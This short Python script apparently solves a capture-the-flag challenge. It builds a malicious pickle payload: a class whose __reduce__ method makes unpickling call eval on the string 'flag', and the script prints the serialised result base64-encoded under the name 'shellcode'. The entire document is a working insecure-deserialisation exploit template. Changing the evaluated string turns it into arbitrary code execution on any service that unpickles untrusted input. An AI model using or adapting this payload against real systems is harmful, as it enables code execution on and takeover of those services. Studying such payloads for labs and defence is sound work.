import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (eval, ("flag", ))

print(Exploit())
shellcode = pickle.dumps(Exploit())
print(base64.urlsafe_b64encode(shellcode))
